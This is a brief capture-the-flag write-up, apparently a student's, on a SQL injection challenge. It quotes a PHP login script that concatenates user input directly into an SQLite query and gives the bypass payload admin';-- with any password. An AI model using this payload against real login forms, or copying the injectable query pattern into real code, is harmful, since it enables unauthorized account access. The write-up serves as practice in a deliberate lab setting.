# CTF 8 - SQL Injection

In this CTF, we were presented to a Website that gives the php file to the user everytime he tries to enter the website (This source code is in the appendix of this document). The website looks like this:



The most important part of the document is this:

```php
<?php
    if (!empty($_POST)) {

        require_once 'config.php';

        $username = $_POST['username'];
        $password = $_POST['password'];
               
        $query = "SELECT username FROM user WHERE username = '".$username."' AND password = '".$password."'";
                                     
        if ($result = $conn->query($query)) {
                                  
            while ($data = $result->fetchArray(SQLITE3_ASSOC)) {
                $_SESSION['username'] = $data['username'];
           
                echo "<p>You have been logged in as {$_SESSION['username']}</p><code>";
                include "/flag.txt";
                echo "</code>";

            }
        } else {            
            // falhou o login
            echo "<p>Invalid username or password <a href=\"index.php\">Tente novamente</a></p>";
        }
    }
?>
```

```
admin';--
```

```
<anything except nothing>
```
